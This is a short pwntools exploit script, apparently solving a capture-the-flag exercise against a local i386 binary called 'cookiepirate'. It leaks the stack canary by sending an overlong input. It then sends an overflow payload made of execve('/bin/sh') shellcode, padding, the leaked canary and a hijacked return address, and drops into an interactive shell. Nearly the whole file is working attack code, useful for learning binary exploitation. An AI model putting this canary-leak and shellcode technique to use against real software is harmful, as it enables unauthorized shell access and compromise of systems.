#!/usr/bin/env python
from pwn import *
context(arch='i386', os='linux')

# Start the program as a subprocess
# so we can communicate with it
p = process('cookiepirate')

# Optional: attach GDB to the process and run some GDB commands
#gdb.attach(p, 'b *0x80486c1')

# Commuicate with the process
# Other communication commands: recv, recvuntil, send, sendafter
# To see everything sent and received by the process, run with ./doit.py DEBUG
print p.recvline()
p.sendline("A" * 129)
res = p.recv()
print res
cookie = res[136:139]
p.sendline("\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80" + "A" * 104 + "\x00" + cookie + "\x00" * 4 + "\x68\x9a\x04\x08")

# Allow the user to read/write to the process (useful when you get a shell!)
p.interactive()
